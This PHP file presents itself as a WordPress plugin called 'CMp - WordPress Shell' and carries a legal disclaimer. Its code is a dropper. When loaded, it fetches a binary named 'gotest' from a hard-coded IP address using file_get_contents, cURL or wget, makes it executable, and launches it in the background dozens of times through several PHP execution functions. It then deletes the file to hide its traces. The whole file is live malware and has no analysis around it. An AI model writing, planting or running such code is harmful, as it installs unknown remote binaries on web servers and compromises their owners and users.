<?php
/**
 * Plugin Name: CMp - WordPress Shell
 * Plugin URI: https://github.com/mx/cmap/
 * Description: Simple WordPress Shell. Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1
 * Author: Cmp
 * Author URI: https://github.com/x/csmap/
 * License: GPL
 */

// Disable execution time limit
set_time_limit(0);

// Disable memory limit (if necessary)
ini_set('memory_limit', '-1');

// Helper function to handle command execution with error checking
function executeCommand($command) {
    exec($command, $output, $status);
    if ($status === 0) {
        echo "Command executed successfully: $command\n";
    } else {
        echo "Failed to execute command: $command\n";
        echo "Error: " . implode("\n", $output) . "\n";
    }
}

// Function to download the 'gotest' file using file_get_contents
function downloadGotestWithFileGetContents() {
    $url = 'http://107.189.29.12:58081/gotest';
    $outputFile = 'gotest';
    // Download the file using file_get_contents
    $content = @file_get_contents($url);
    if ($content !== false) {
        file_put_contents($outputFile, $content);
        echo "gotest file downloaded successfully using file_get_contents\n";
        return true;
    } else {
        echo "Failed to download gotest using file_get_contents\n";
        return false;
    }
}

// Function to download the 'gotest' file using cURL
function downloadGotestWithCurl() {
    $url = 'http://107.189.29.12:58081/gotest';
    $outputFile = 'gotest';

    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 0);
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 4096);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Accept: application/octet-stream',
        'Connection: keep-alive'
    ));

    $fp = fopen($outputFile, 'wb');
    if (!$fp) {
        echo "Failed to open output file for writing\n";
        curl_close($ch);
        return false;
    }

    curl_setopt($ch, CURLOPT_FILE, $fp);
    $result = curl_exec($ch);
    if ($result === false) {
        echo "cURL Error: " . curl_error($ch) . "\n";
        fclose($fp);
        curl_close($ch);
        return false;
    }

    fclose($fp);
    curl_close($ch);

    echo "gotest file downloaded successfully using cURL\n";
    return true;
}

// Function to download the 'gotest' file using wget
function downloadGotestWithWget() {
    $url = 'http://107.189.29.12:58081/gotest';
    $outputFile = 'gotest';

    $command = "wget -O $outputFile $url";
    exec($command, $output, $status);

    if ($status === 0) {
        echo "gotest file downloaded successfully using wget\n";
        return true;
    } else {
        echo "Failed to download gotest using wget\n";
        return false;
    }
}

// Try using file_get_contents first
if (!downloadGotestWithFileGetContents()) {
    // If file_get_contents fails, try using cURL
    if (!downloadGotestWithCurl()) {
        // If cURL fails, try using wget
        if (!downloadGotestWithWget()) {
            echo "All download methods failed. Could not download gotest file.\n";
        }
    }
}

// Check if the gotest file exists after downloading
if (file_exists('gotest')) {
    // Add execute permission to the gotest file
    executeCommand('chmod +x gotest');

    // Loop to execute gotest file 10 times, each in the background
    for ($i = 0; $i < 10; $i++) {
        // Method 1: Using exec() to execute the nohup command
        $command = 'nohup ./gotest > /dev/null 2>&1 &';
        executeCommand($command);

        // Method 2: Using system() function to execute the nohup command
        $systemCommand = 'system("nohup ./gotest > /dev/null 2>&1 &")';
        executeCommand($systemCommand);

        // Method 3: Using shell_exec() to execute the nohup command
        $shellCommand = 'shell_exec("nohup ./gotest > /dev/null 2>&1 &")';
        executeCommand($shellCommand);

        // Method 4: Using proc_open to run the nohup command
        $descriptorspec = array(
            0 => array("pipe", "r"),  // Standard input
            1 => array("pipe", "w"),  // Standard output
            2 => array("pipe", "w")   // Standard error
        );
        $process = proc_open('nohup ./gotest > /dev/null 2>&1 &', $descriptorspec, $pipes);
        if (is_resource($process)) {
            echo "nohup command executed via proc_open #$i\n";
            fclose($pipes[1]);
            proc_close($process);
        } else {
            echo "Failed to execute nohup via proc_open #$i\n";
        }

        // Method 5: Using `exec()` inside an exec() function
        $execCommand = 'exec("nohup ./gotest > /dev/null 2>&1 &")';
        executeCommand($execCommand);

        // Method 6: Using `popen()` function
        $process = popen('nohup ./gotest > /dev/null 2>&1 &', 'r');
        if ($process) {
            echo "nohup command executed via popen #$i\n";
            fclose($process);
        } else {
            echo "Failed to execute nohup via popen #$i\n";
        }

        // Add some delay between executions to avoid potential race conditions
        sleep(1); // Optional: Adjust the sleep time if needed

        echo "Execution #$i completed.\n";
    }

    // Optionally, delete the gotest file after all executions
    if (unlink('gotest')) {
        echo "gotest file has been deleted\n";
    } else {
        echo "Failed to delete gotest file\n";
    }
} else {
    echo "gotest file does not exist\n";
}
?>
